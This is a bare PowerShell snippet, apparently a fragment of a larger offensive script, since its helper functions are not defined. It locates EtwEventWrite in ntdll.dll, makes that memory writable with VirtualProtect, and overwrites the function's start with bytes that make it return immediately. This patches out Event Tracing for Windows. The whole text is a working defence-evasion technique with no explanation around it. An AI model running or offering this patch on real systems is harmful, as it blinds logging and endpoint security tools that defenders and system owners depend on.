[IntPtr]$funcAddr = LookupFunc ntdll.dll EtwEventWrite
$oldProtectionBuffer = 0
$testRsiRsiAddr = $funcAddr.ToInt64()
Write-Host "Memory Address: 0x$([Convert]::ToString($testRsiRsiAddr,16))"

$byteValue = [System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]$testRsiRsiAddr)

Write-Host "Byte at address 0x$([Convert]::ToString($testRsiRsiAddr,16)): 0x$([Convert]::ToString($byteValue,16))"
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))



$buf = [Byte[]] (0x48, 0x33, 0xc0, 0xc3)

$vp.Invoke($testRsiRsiAddr, 4, 0x40, [ref]$oldProtectionBuffer)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $testRsiRsiAddr, 4)

$vp.Invoke($testRsiRsiAddr, 4, 0x20, [ref]$oldProtectionBuffer)
